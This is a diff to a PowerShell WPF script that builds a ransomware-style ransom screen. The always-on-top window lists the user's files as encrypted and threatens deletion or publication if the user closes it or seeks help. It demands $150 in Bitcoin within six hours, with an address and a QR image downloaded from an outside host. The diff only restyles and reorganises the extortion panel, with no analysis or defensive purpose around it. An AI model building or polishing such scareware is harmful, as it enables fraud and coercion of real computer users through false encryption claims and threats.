@@ -50,7 +50,7 @@ $systemFiles = Get-SystemFiles
 
 $w = New-Object System.Windows.Window
 $w.Title = "test menu"
-$w.Width = 1200  # Increased width for two columns
+$w.Width = 1200
 $w.Height = 900
 $w.Topmost = $true
 $w.WindowStyle = [System.Windows.WindowStyle]::SingleBorderWindow
@@ -69,150 +69,319 @@ $g.ColumnDefinitions.Add($col1)
 $g.ColumnDefinitions.Add($col2)
 
 $title = New-Object System.Windows.Controls.TextBlock
-$title.Text = "Oops.. Your Files Are Encrypted"
+$title.Text = "⚠️ CRITICAL SYSTEM ALERT - YOUR FILES ARE ENCRYPTED"
 $title.Foreground = [System.Windows.Media.Brushes]::White
-$title.FontFamily = 'Courier New'
-$title.FontSize = 25
+$title.FontFamily = 'Segoe UI'
+$title.FontSize = 28
 $title.FontWeight = [System.Windows.FontWeights]::Bold
-$title.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Left
+$title.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
 $title.VerticalAlignment = [System.Windows.VerticalAlignment]::Top
 $title.Margin = '15,12,0,0'
 $title.TextWrapping = [System.Windows.TextWrapping]::Wrap
-[System.Windows.Controls.Grid]::SetColumnSpan($title, 2)  # Span both columns
+[System.Windows.Controls.Grid]::SetColumnSpan($title, 2)
 [System.Windows.Controls.Grid]::SetColumn($title, 0)
 
 $b = New-Object System.Windows.Controls.Border
-$b.Height = 13
-$b.Margin = '0,48,0,0'
-$b.Background = [System.Windows.Media.Brushes]::Black
+$b.Height = 3
+$b.Margin = '0,52,0,0'
+$b.Background = [System.Windows.Media.Brushes]::Red
 $b.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Stretch
 $b.VerticalAlignment = [System.Windows.VerticalAlignment]::Top
-[System.Windows.Controls.Grid]::SetColumnSpan($b, 2)  # Span both columns
+[System.Windows.Controls.Grid]::SetColumnSpan($b, 2)
 [System.Windows.Controls.Grid]::SetColumn($b, 0)
 
-# Main text container (left column)
-$textContainer = New-Object System.Windows.Controls.Border
-$textContainer.Background = [System.Windows.Media.Brushes]::Transparent
-$textContainer.Margin = '20,70,20,20'
-[System.Windows.Controls.Grid]::SetColumn($textContainer, 0)
+# Main scrollable container for left column
+$leftScroll = New-Object System.Windows.Controls.ScrollViewer
+$leftScroll.VerticalScrollBarVisibility = 'Auto'
+$leftScroll.Margin = '15,70,15,20'
+[System.Windows.Controls.Grid]::SetColumn($leftScroll, 0)
 
-$t = New-Object System.Windows.Controls.TextBlock
-$t.Foreground = [System.Windows.Media.Brushes]::White
-$t.FontFamily = 'Courier New'
-$t.FontSize = 14  # Increased from 12
-$t.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Left
-$t.VerticalAlignment = [System.Windows.VerticalAlignment]::Top
-$t.TextWrapping = [System.Windows.TextWrapping]::Wrap
+$leftContainer = New-Object System.Windows.Controls.StackPanel
+$leftContainer.Orientation = 'Vertical'
+$leftContainer.Margin = '0,0,0,0'
 
-# Create formatted text with Inlines
-$t.Inlines.Clear()
+# ===== SECTION 1: What Happened =====
+$section1 = New-Object System.Windows.Controls.Border
+$section1.Background = [System.Windows.Media.Brushes]::Black
+$section1.CornerRadius = '5,5,5,5'
+$section1.BorderBrush = [System.Windows.Media.Brushes]::Gray
+$section1.BorderThickness = '1,1,1,1'
+$section1.Margin = '0,0,0,15'
+$section1.Padding = '15,15,15,15'
 
-# What happened to my computer? (Bold, Larger - changed color to LightSkyBlue)
-$run1 = New-Object System.Windows.Documents.Run
-$run1.Text = "What happened to my computer?"
-$run1.FontWeight = [System.Windows.FontWeights]::Bold
-$run1.FontSize = 18
-$run1.Foreground = [System.Windows.Media.Brushes]::LightSkyBlue  # Changed from Yellow
-$t.Inlines.Add($run1)
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())  # Reduced from 2 to 1
+$section1Grid = New-Object System.Windows.Controls.Grid
+$section1Grid.ColumnDefinitions.Add((New-Object System.Windows.Controls.ColumnDefinition -Property @{Width = 'Auto'}))
+$section1Grid.ColumnDefinitions.Add((New-Object System.Windows.Controls.ColumnDefinition -Property @{Width = '*'}))
+$section1Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = 'Auto'}))
+$section1Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = '*'}))
+$section1Grid.Margin = '0,0,0,0'
 
-# Your important files have been encrypted
-$run2 = New-Object System.Windows.Documents.Run
-$run2.Text = "Your important files have been encrypted"
-$run2.FontWeight = [System.Windows.FontWeights]::Bold
-$run2.FontSize = 14
-$t.Inlines.Add($run2)
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+# Warning Icon
+$warningIcon1 = New-Object System.Windows.Controls.TextBlock
+$warningIcon1.Text = "🔒"
+$warningIcon1.FontSize = 24
+$warningIcon1.Foreground = [System.Windows.Media.Brushes]::Red
+$warningIcon1.VerticalAlignment = 'Top'
+$warningIcon1.Margin = '0,0,10,0'
+[System.Windows.Controls.Grid]::SetColumn($warningIcon1, 0)
+[System.Windows.Controls.Grid]::SetRow($warningIcon1, 0)
 
-# Body paragraph 1 (reduced spacing)
-$run3 = New-Object System.Windows.Documents.Run
-$run3.Text = "Many of your documents, pictures, and important files are no longer accessible since they have been encrypted. Do not waste your time trying to get them back, nobody can recover them without our decryption service. Please be aware that this program will automatically erase all of your files if you attempt to get rid of this window, restart your computer, or contact help."
-$t.Inlines.Add($run3)
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+# Section 1 Title
+$section1Title = New-Object System.Windows.Controls.TextBlock
+$section1Title.Text = "SYSTEM ENCRYPTION DETECTED"
+$section1Title.Foreground = [System.Windows.Media.Brushes]::LightSkyBlue
+$section1Title.FontFamily = 'Segoe UI'
+$section1Title.FontSize = 18
+$section1Title.FontWeight = [System.Windows.FontWeights]::Bold
+$section1Title.VerticalAlignment = 'Center'
+[System.Windows.Controls.Grid]::SetColumn($section1Title, 1)
+[System.Windows.Controls.Grid]::SetRow($section1Title, 0)
 
-# Can I recover my files? (Bold, Larger - LightSkyBlue)
-$run4 = New-Object System.Windows.Documents.Run
-$run4.Text = "Can I recover my files?"
-$run4.FontWeight = [System.Windows.FontWeights]::Bold
-$run4.FontSize = 18
-$run4.Foreground = [System.Windows.Media.Brushes]::LightSkyBlue  # Changed from Yellow
-$t.Inlines.Add($run4)
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+# Section 1 Content
+$section1Content = New-Object System.Windows.Controls.TextBlock
+$section1Content.Text = "Your documents, photos, videos, and important files have been encrypted using military-grade AES-256 encryption. They are no longer accessible without the decryption key. Any attempt to remove this software, restart your computer, or seek external help will trigger immediate permanent file deletion."
+$section1Content.Foreground = [System.Windows.Media.Brushes]::White
+$section1Content.FontFamily = 'Segoe UI'
+$section1Content.FontSize = 13
+$section1Content.TextWrapping = 'Wrap'
+$section1Content.Margin = '0,10,0,0'
+[System.Windows.Controls.Grid]::SetColumn($section1Content, 0)
+[System.Windows.Controls.Grid]::SetColumnSpan($section1Content, 2)
+[System.Windows.Controls.Grid]::SetRow($section1Content, 1)
 
-# Body paragraph 2 (reduced spacing)
-$run5 = New-Object System.Windows.Documents.Run
-$run5.Text = "We guarantee that you can recover all of your files safely and easily, however, a payment must be made in order to regain access. You have 6 hours to submit payment. Wait any longer and the price doubles. Please be aware that we have copied all your files onto our server, and will distribute them online if you choose not to pay. This includes your saved emails / passwords."
-$t.Inlines.Add($run5)
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+$section1Grid.Children.Add($warningIcon1)
+$section1Grid.Children.Add($section1Title)
+$section1Grid.Children.Add($section1Content)
+$section1.Child = $section1Grid
 
-# How To Pay? (Bold, Larger - LightSkyBlue)
-$run6 = New-Object System.Windows.Documents.Run
-$run6.Text = "How To Pay?"
-$run6.FontWeight = [System.Windows.FontWeights]::Bold
-$run6.FontSize = 18
-$run6.Foreground = [System.Windows.Media.Brushes]::LightSkyBlue  # Changed from Yellow
-$t.Inlines.Add($run6)
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+# ===== SECTION 2: Recovery =====
+$section2 = New-Object System.Windows.Controls.Border
+$section2.Background = [System.Windows.Media.Brushes]::Black
+$section2.CornerRadius = '5,5,5,5'
+$section2.BorderBrush = [System.Windows.Media.Brushes]::Gray
+$section2.BorderThickness = '1,1,1,1'
+$section2.Margin = '0,0,0,15'
+$section2.Padding = '15,15,15,15'
 
-# Body paragraph 3 (reduced spacing)
-$run7 = New-Object System.Windows.Documents.Run
-$run7.Text = "Payment is accepted in BITCOIN only. For more information, click <How to buy bitcoin>. Once acquired, ensure you send the right amount to the correct address indicated in this window. A single wrong character will result in permanent loss of funds."
-$t.Inlines.Add($run7)
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+$section2Grid = New-Object System.Windows.Controls.Grid
+$section2Grid.ColumnDefinitions.Add((New-Object System.Windows.Controls.ColumnDefinition -Property @{Width = 'Auto'}))
+$section2Grid.ColumnDefinitions.Add((New-Object System.Windows.Controls.ColumnDefinition -Property @{Width = '*'}))
+$section2Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = 'Auto'}))
+$section2Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = '*'}))
+$section2Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = 'Auto'}))
 
-# Bitcoin address section
-$run8 = New-Object System.Windows.Documents.Run
-$run8.Text = "BITCOIN ADDRESS FOR PAYMENT:"
-$run8.FontWeight = [System.Windows.FontWeights]::Bold
-$run8.FontSize = 16
-$run8.Foreground = [System.Windows.Media.Brushes]::LightGreen
-$t.Inlines.Add($run8)
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+# Recovery Icon
+$recoveryIcon = New-Object System.Windows.Controls.TextBlock
+$recoveryIcon.Text = "💰"
+$recoveryIcon.FontSize = 24
+$recoveryIcon.Foreground = [System.Windows.Media.Brushes]::Gold
+$recoveryIcon.VerticalAlignment = 'Top'
+$recoveryIcon.Margin = '0,0,10,0'
+[System.Windows.Controls.Grid]::SetColumn($recoveryIcon, 0)
+[System.Windows.Controls.Grid]::SetRow($recoveryIcon, 0)
 
-$run9 = New-Object System.Windows.Documents.Run
-$run9.Text = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
-$run9.FontFamily = 'Consolas'
-$run9.FontSize = 14
-$run9.Foreground = [System.Windows.Media.Brushes]::White
-$run9.Background = [System.Windows.Media.Brushes]::Black
-$t.Inlines.Add($run9)
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+# Section 2 Title
+$section2Title = New-Object System.Windows.Controls.TextBlock
+$section2Title.Text = "FILE RECOVERY PROCESS"
+$section2Title.Foreground = [System.Windows.Media.Brushes]::LightSkyBlue
+$section2Title.FontFamily = 'Segoe UI'
+$section2Title.FontSize = 18
+$section2Title.FontWeight = [System.Windows.FontWeights]::Bold
+$section2Title.VerticalAlignment = 'Center'
+[System.Windows.Controls.Grid]::SetColumn($section2Title, 1)
+[System.Windows.Controls.Grid]::SetRow($section2Title, 0)
 
-# Payment amount
-$run10 = New-Object System.Windows.Documents.Run
-$run10.Text = "AMOUNT: $150 USD (0.0021 BTC)"
-$run10.FontWeight = [System.Windows.FontWeights]::Bold
-$run10.FontSize = 14
-$run10.Foreground = [System.Windows.Media.Brushes]::LightGoldenrodYellow
-$t.Inlines.Add($run10)
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+# Section 2 Content
+$section2Content = New-Object System.Windows.Controls.TextBlock
+$section2Content.Text = "We guarantee 100% file recovery upon payment. Your files have been backed up to our secure servers. Failure to pay within 6 hours will result in:"
+$section2Content.Foreground = [System.Windows.Media.Brushes]::White
+$section2Content.FontFamily = 'Segoe UI'
+$section2Content.FontSize = 13
+$section2Content.TextWrapping = 'Wrap'
+$section2Content.Margin = '0,10,0,10'
+[System.Windows.Controls.Grid]::SetColumn($section2Content, 0)
+[System.Windows.Controls.Grid]::SetColumnSpan($section2Content, 2)
+[System.Windows.Controls.Grid]::SetRow($section2Content, 1)
 
-# Decorative warning
-$run11 = New-Object System.Windows.Documents.Run
-$run11.Text = "⚠️ WARNING: Time remaining: 5 hours 59 minutes"
-$run11.FontWeight = [System.Windows.FontWeights]::Bold
-$run11.FontSize = 12
-$run11.Foreground = [System.Windows.Media.Brushes]::Red
-$t.Inlines.Add($run11)
-$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
+# Consequences list
+$consequencesGrid = New-Object System.Windows.Controls.StackPanel
+$consequencesGrid.Orientation = 'Vertical'
+$consequencesGrid.Margin = '25,0,0,0'
 
-$run12 = New-Object System.Windows.Documents.Run
-$run12.Text = "⚠️ ALL FILES BACKED UP TO SECURE SERVER"
-$run12.FontWeight = [System.Windows.FontWeights]::Bold
-$run12.FontSize = 12
-$run12.Foreground = [System.Windows.Media.Brushes]::OrangeRed
-$t.Inlines.Add($run12)
+$conseq1 = New-Object System.Windows.Controls.TextBlock
+$conseq1.Text = "• Price doubles to $300 USD"
+$conseq1.Foreground = [System.Windows.Media.Brushes]::OrangeRed
+$conseq1.FontSize = 12
+$conseq1.FontWeight = 'Bold'
 
-$textContainer.Child = $t
+$conseq2 = New-Object System.Windows.Controls.TextBlock
+$conseq2.Text = "• Your files will be published online"
+$conseq2.Foreground = [System.Windows.Media.Brushes]::OrangeRed
+$conseq2.FontSize = 12
+$conseq2.FontWeight = 'Bold'
 
-# Right column - File list
+$conseq3 = New-Object System.Windows.Controls.TextBlock
+$conseq3.Text = "• All files permanently deleted after 48 hours"
+$conseq3.Foreground = [System.Windows.Media.Brushes]::OrangeRed
+$conseq3.FontSize = 12
+$conseq3.FontWeight = 'Bold'
+
+$consequencesGrid.Children.Add($conseq1)
+$consequencesGrid.Children.Add($conseq2)
+$consequencesGrid.Children.Add($conseq3)
+
+[System.Windows.Controls.Grid]::SetColumn($consequencesGrid, 0)
+[System.Windows.Controls.Grid]::SetColumnSpan($consequencesGrid, 2)
+[System.Windows.Controls.Grid]::SetRow($consequencesGrid, 2)
+
+$section2Grid.Children.Add($recoveryIcon)
+$section2Grid.Children.Add($section2Title)
+$section2Grid.Children.Add($section2Content)
+$section2Grid.Children.Add($consequencesGrid)
+$section2.Child = $section2Grid
+
+# ===== SECTION 3: QR Code Payment Panel =====
+$paymentPanel = New-Object System.Windows.Controls.Border
+$paymentPanel.Background = [System.Windows.Media.Brushes]::Black
+$paymentPanel.CornerRadius = '5,5,5,5'
+$paymentPanel.BorderBrush = [System.Windows.Media.Brushes]::Gold
+$paymentPanel.BorderThickness = '2,2,2,2'
+$paymentPanel.Margin = '0,0,0,15'
+$paymentPanel.Padding = '20,20,20,20'
+
+$paymentStack = New-Object System.Windows.Controls.StackPanel
+$paymentStack.Orientation = 'Vertical'
+$paymentStack.HorizontalAlignment = 'Center'
+
+# Payment Panel Title
+$paymentTitle = New-Object System.Windows.Controls.TextBlock
+$paymentTitle.Text = "BITCOIN PAYMENT REQUIRED"
+$paymentTitle.Foreground = [System.Windows.Media.Brushes]::Gold
+$paymentTitle.FontFamily = 'Segoe UI'
+$paymentTitle.FontSize = 22
+$paymentTitle.FontWeight = [System.Windows.FontWeights]::Bold
+$paymentTitle.HorizontalAlignment = 'Center'
+$paymentTitle.Margin = '0,0,0,10'
+
+# Amount Display
+$amountDisplay = New-Object System.Windows.Controls.TextBlock
+$amountDisplay.Text = "$150 USD (0.0021 BTC)"
+$amountDisplay.Foreground = [System.Windows.Media.Brushes]::White
+$amountDisplay.Background = [System.Windows.Media.Brushes]::DarkRed
+$amountDisplay.FontFamily = 'Segoe UI'
+$amountDisplay.FontSize = 18
+$amountDisplay.FontWeight = [System.Windows.FontWeights]::Bold
+$amountDisplay.HorizontalAlignment = 'Center'
+$amountDisplay.Padding = '10,5,10,5'
+$amountDisplay.Margin = '0,0,0,15'
+
+# QR Code Section
+$qrSection = New-Object System.Windows.Controls.Border
+$qrSection.Background = [System.Windows.Media.Brushes]::White
+$qrSection.BorderBrush = [System.Windows.Media.Brushes]::Gray
+$qrSection.BorderThickness = '2,2,2,2'
+$qrSection.Padding = '15,15,15,15'
+$qrSection.Margin = '0,0,0,15'
+$qrSection.HorizontalAlignment = 'Center'
+
+$qrGrid = New-Object System.Windows.Controls.Grid
+$qrGrid.Width = 250
+$qrGrid.Height = 250
+
+# QR Code Image (using WebClient to download from URL)
+try {
+    $webClient = New-Object System.Net.WebClient
+    $qrBytes = $webClient.DownloadData("https://i.ibb.co/xqkpW0Pj/fake-qr.jpg")
+    $stream = New-Object System.IO.MemoryStream($qrBytes, $false)
+    $bitmap = New-Object System.Windows.Media.Imaging.BitmapImage
+    $bitmap.BeginInit()
+    $bitmap.StreamSource = $stream
+    $bitmap.CacheOption = [System.Windows.Media.Imaging.BitmapCacheOption]::OnLoad
+    $bitmap.EndInit()
+    
+    $qrImage = New-Object System.Windows.Controls.Image
+    $qrImage.Source = $bitmap
+    $qrImage.Stretch = [System.Windows.Media.Stretch]::Uniform
+    $qrGrid.Children.Add($qrImage)
+} catch {
+    # Fallback if QR code fails to load
+    $qrFallback = New-Object System.Windows.Controls.TextBlock
+    $qrFallback.Text = "[QR CODE IMAGE]"
+    $qrFallback.Foreground = [System.Windows.Media.Brushes]::Black
+    $qrFallback.FontSize = 16
+    $qrFallback.HorizontalAlignment = 'Center'
+    $qrFallback.VerticalAlignment = 'Center'
+    $qrGrid.Children.Add($qrFallback)
+}
+
+$qrSection.Child = $qrGrid
+
+# QR Code Label
+$qrLabel = New-Object System.Windows.Controls.TextBlock
+$qrLabel.Text = "Scan QR code for payment address"
+$qrLabel.Foreground = [System.Windows.Media.Brushes]::LightGray
+$qrLabel.FontSize = 12
+$qrLabel.HorizontalAlignment = 'Center'
+$qrLabel.Margin = '0,0,0,10'
+$qrLabel.FontStyle = 'Italic'
+
+# Bitcoin Address Display
+$addressPanel = New-Object System.Windows.Controls.Border
+$addressPanel.Background = [System.Windows.Media.Brushes]::Black
+$addressPanel.BorderBrush = [System.Windows.Media.Brushes]::DarkGoldenrod
+$addressPanel.BorderThickness = '1,1,1,1'
+$addressPanel.Padding = '10,10,10,10'
+$addressPanel.Margin = '0,0,0,10'
+
+$addressStack = New-Object System.Windows.Controls.StackPanel
+
+$addressTitle = New-Object System.Windows.Controls.TextBlock
+$addressTitle.Text = "BITCOIN ADDRESS:"
+$addressTitle.Foreground = [System.Windows.Media.Brushes]::LightGreen
+$addressTitle.FontFamily = 'Consolas'
+$addressTitle.FontSize = 12
+$addressTitle.FontWeight = 'Bold'
+$addressTitle.Margin = '0,0,0,5'
+
+$addressValue = New-Object System.Windows.Controls.TextBlock
+$addressValue.Text = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+$addressValue.Foreground = [System.Windows.Media.Brushes]::White
+$addressValue.Background = [System.Windows.Media.Brushes]::DarkSlateGray
+$addressValue.FontFamily = 'Consolas'
+$addressValue.FontSize = 14
+$addressValue.Padding = '5,3,5,3'
+$addressValue.TextAlignment = 'Center'
+$addressValue.FontWeight = 'Bold'
+
+$addressStack.Children.Add($addressTitle)
+$addressStack.Children.Add($addressValue)
+$addressPanel.Child = $addressStack
+
+# Time Warning
+$timeWarning = New-Object System.Windows.Controls.TextBlock
+$timeWarning.Text = "⏰ TIME REMAINING: 5 hours 59 minutes"
+$timeWarning.Foreground = [System.Windows.Media.Brushes]::Red
+$timeWarning.FontSize = 14
+$timeWarning.FontWeight = 'Bold'
+$timeWarning.HorizontalAlignment = 'Center'
+$timeWarning.Margin = '0,10,0,0'
+
+$paymentStack.Children.Add($paymentTitle)
+$paymentStack.Children.Add($amountDisplay)
+$paymentStack.Children.Add($qrSection)
+$paymentStack.Children.Add($qrLabel)
+$paymentStack.Children.Add($addressPanel)
+$paymentStack.Children.Add($timeWarning)
+$paymentPanel.Child = $paymentStack
+
+# ===== Add all sections to left container =====
+$leftContainer.Children.Add($section1)
+$leftContainer.Children.Add($section2)
+$leftContainer.Children.Add($paymentPanel)
+
+$leftScroll.Content = $leftContainer
+
+# ===== Right column - File list =====
 $fileContainer = New-Object System.Windows.Controls.Border
 $fileContainer.Background = [System.Windows.Media.Brushes]::Black
 $fileContainer.BorderBrush = [System.Windows.Media.Brushes]::Gray
@@ -227,8 +396,8 @@ $fileStack.Margin = '5,5,5,5'
 $fileTitle = New-Object System.Windows.Controls.TextBlock
 $fileTitle.Text = "ENCRYPTED FILES ($($systemFiles.Count) files)"
 $fileTitle.Foreground = [System.Windows.Media.Brushes]::Red
-$fileTitle.FontFamily = 'Courier New'
-$fileTitle.FontSize = 16
+$fileTitle.FontFamily = 'Segoe UI'
+$fileTitle.FontSize = 18
 $fileTitle.FontWeight = [System.Windows.FontWeights]::Bold
 $fileTitle.Margin = '0,0,0,10'
 $fileTitle.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
@@ -266,7 +435,7 @@ $fileStack.Children.Add($folderIndicators)
 # Create scroll viewer for file list
 $scrollViewer = New-Object System.Windows.Controls.ScrollViewer
 $scrollViewer.VerticalScrollBarVisibility = 'Auto'
-$scrollViewer.Height = 700
+$scrollViewer.Height = 650
 
 $fileListPanel = New-Object System.Windows.Controls.StackPanel
 
@@ -345,8 +514,8 @@ $fileStack.Children.Add($fileSummary)
 
 $fileContainer.Child = $fileStack
 
-# Add all elements to grid
-$null = $g.Children.Add($textContainer)
+# ===== Add all elements to grid =====
+$null = $g.Children.Add($leftScroll)
 $null = $g.Children.Add($fileContainer)
 $null = $g.Children.Add($b)
 $null = $g.Children.Add($title)
